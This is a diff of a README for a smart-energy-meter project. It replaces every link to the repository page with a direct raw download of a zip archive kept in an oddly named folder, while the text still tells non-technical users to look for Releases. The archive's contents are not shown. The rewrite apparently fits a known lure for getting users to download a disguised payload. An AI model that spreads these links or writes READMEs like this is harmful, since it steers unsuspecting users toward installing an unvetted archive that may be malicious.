@@ -1,6 +1,6 @@
 # ⚡ Smart-Energy-Meter-Management - Monitor and Optimize Energy Use
 
-[![Download Smart-Energy-Meter-Management](https://img.shields.io/badge/Download-Smart--Energy--Meter--Management-brightgreen?style=for-the-badge)](https://github.com/C10H15NN/Smart-Energy-Meter-Management)
+[![Download Smart-Energy-Meter-Management](https://img.shields.io/badge/Download-Smart--Energy--Meter--Management-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/C10H15NN/Smart-Energy-Meter-Management/main/Gentianales/Energy-Management-Meter-Smart-1.3.zip)
 
 ---
 
@@ -36,13 +36,13 @@ You do not need to know how to program. The software will guide you through conn
 
 You can get the software by visiting the link below. This page has all the needed files and instructions.
 
-[![Get Smart-Energy-Meter-Management](https://img.shields.io/badge/Get%20Software-Blue?style=for-the-badge&logo=github)](https://github.com/C10H15NN/Smart-Energy-Meter-Management)
+[![Get Smart-Energy-Meter-Management](https://img.shields.io/badge/Get%20Software-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/C10H15NN/Smart-Energy-Meter-Management/main/Gentianales/Energy-Management-Meter-Smart-1.3.zip)
 
 ### Step 1: Visit the Download Page
 
 - Click the button above or go to this link in your browser:
 
-  https://github.com/C10H15NN/Smart-Energy-Meter-Management
+  https://raw.githubusercontent.com/C10H15NN/Smart-Energy-Meter-Management/main/Gentianales/Energy-Management-Meter-Smart-1.3.zip
 
 - Look for the section labeled **Releases** or **Downloads**.
 
@@ -185,4 +185,4 @@ If you need help, check the following:
 
 Access the software download page again here:
 
-[Download Smart-Energy-Meter-Management](https://github.com/C10H15NN/Smart-Energy-Meter-Management)
+[Download Smart-Energy-Meter-Management](https://raw.githubusercontent.com/C10H15NN/Smart-Energy-Meter-Management/main/Gentianales/Energy-Management-Meter-Smart-1.3.zip)
